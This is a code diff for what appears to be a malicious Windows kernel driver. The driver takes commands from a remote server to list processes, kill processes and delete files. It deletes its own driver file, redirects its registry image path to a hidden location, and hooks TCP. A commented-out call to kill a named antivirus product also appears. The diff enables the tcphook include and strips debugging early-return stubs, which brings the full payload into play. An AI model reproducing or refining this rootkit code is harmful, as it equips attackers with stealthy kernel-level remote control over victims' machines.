@@ -29,7 +29,7 @@ VOID InitializeObjectAttributes(
 #include "system.h"
 #include "network.h"
 #include "xlog.h"
-//#include "tcphook.h"
+#include "tcphook.h"
 #include "config.h"
 
 PDEVICE_OBJECT g_pCtrlDO = NULL;
@@ -198,8 +198,7 @@ NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 				if (inLen > 700) {
 					goto IRPCOMPLETE;
 				}
-				//ExAllocatePoolWithTag
-				PSTR kStr = ExAllocatePoolWithTag(NonPagedPool, inLen + 16, 'loli');
+				PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
 				if (kStr == NULL) {
 					goto IRPCOMPLETE;
 				}
@@ -233,7 +232,6 @@ NTSTATUS HandleServerPacket(
 	PCHAR msg,
 	PCHAR pNeedReply
 ) {
-	
 	LONG msgLen = strlen(msg);
 	if (msgLen > NETBUFF_LENGTH) {
 		xLog("buffer over flowed");
@@ -252,16 +250,15 @@ NTSTATUS HandleServerPacket(
 	if (strncmp(msg, CMD_TASKLIST, strlen(CMD_TASKLIST)) == 0) {
 		status = tasklist_user(msg, NETBUFF_LENGTH);
 	}
-	
+
 	if (strncmp(msg, CMD_KILL, strlen(CMD_KILL)) == 0) {
 		
 		ANSI_STRING ansipid;
 		RtlInitAnsiString(&ansipid, msg + strlen(CMD_KILL));
 		UNICODE_STRING unipid;
 		RtlAnsiStringToUnicodeString(&unipid, &ansipid, TRUE);
-		DWORD pid = -1;
-		//status = RtlUnicodeStringToInt64(&unipid, 0, &pid, NULL);
-		status = RtlUnicodeStringToInteger(&unipid, 0, &pid);
+		DWORD pid;
+		status = RtlUnicodeStringToInt64(&unipid, 0, &pid, NULL);
 		if (NT_SUCCESS(status)) {
 			status = xkill3(pid);
 			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xkill 3 success return %p\n", status);
@@ -269,7 +266,7 @@ NTSTATUS HandleServerPacket(
 		RtlFreeUnicodeString(&unipid);
 		
 	}
-	//return STATUS_UNSUCCESSFUL;
+
 	if (strncmp(msg, CMD_DEL, strlen(CMD_DEL)) == 0) {
 		status = xDelFile3(msg + strlen(CMD_DEL) + 1);
 		
@@ -342,8 +339,8 @@ NTSTATUS systemThreadProc() {
 		timeout.QuadPart *= 15;
 		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
 	}
-	PCHAR msg = (PCHAR)ExAllocatePoolWithTag(
-		NonPagedPool,
+	PCHAR msg = (PCHAR)ExAllocatePool2(
+		POOL_FLAG_NON_PAGED,
 		NETBUFF_LENGTH,
 		'netb'
 	);
@@ -513,7 +510,6 @@ NTSTATUS monitorThreadProc() {
 }
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
-	//return STATUS_SUCCESS;
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	//create devices
 	//return STATUS_SUCCESS;
@@ -521,7 +517,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	xLog("DriverEntryCalled");
 	UNICODE_STRING usDeviceName;
 	UNICODE_STRING usSymbolName;
-	//return STATUS_SUCCESS;
+
 	RtlInitUnicodeString(&usDeviceName, DEVICE_NAME);
 
 	status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pCtrlDO);
@@ -550,7 +546,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	}
 	//driver init finished
 	//init log file
-	//return STATUS_SUCCESS;
+	
 
 	
 	PUNICODE_STRING pusDriverPath = NULL;
@@ -558,7 +554,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	//pDriverObject->DriverSection
 
 	//Read Self
-	//return STATUS_SUCCESS;
+	
 	OBJECT_ATTRIBUTES objself;
 	//UNICODE_STRING logPath;
 	IO_STATUS_BLOCK ios;
@@ -581,7 +577,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 		NULL,
 		IO_NO_PARAMETER_CHECKING,
 		NULL);
-	
+
 	if (!NT_SUCCESS(status)) {
 		xLog("open self failed");
 	}
@@ -620,13 +616,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 		}
 		ZwClose(hSelfFile);
 	}
-	
 	//Delete Self
 	ENTRY_DEL_SELF:
 	DelDriverFile(pusDriverPath);
 	xLogW(pRegistryPath);
-	//return STATUS_SUCCESS;
-	//CloseLogFile();
+
 	//PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
 	//UNICODE_STRING uniV;
 	//RtlInitUnicodeString(&uniV, L"ImagePath");
@@ -656,7 +650,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	RtlStringCbLengthW(HIDDEN_PATH, 1000, &dw2);
 	status = setRegW(pRegistryPath, &uniV, REG_SZ, HIDDEN_PATH, sizeof(HIDDEN_PATH));
 
-	
+
 	if (!NT_SUCCESS(status)) {
 		xLog("failed to set reg image path");
 	}
@@ -710,13 +704,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	if (selfContent != NULL) {
 		ExFreePoolWithTag(selfContent, 'self');
 	}
-	//return STATUS_SUCCESS;
+
 	CLIENT_ID       clientId = { 0 };
 	//xDel1("C:\\test\\1.txt");
 	//kill360_64();
 	initWsk();
-	//DbgPrint("addr %p", queryRegA);
-	//return STATUS_SUCCESS;
 	//create network system thread
 	xLog("Creating System Thread");
 	HANDLE hSysThread = NULL;
@@ -740,7 +732,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 		NULL
 	);
 	ZwClose(hSysThread);
-
 	//start a monitor thread, to kill the primary thread
 	PsCreateSystemThread(
 		&hSysThread,
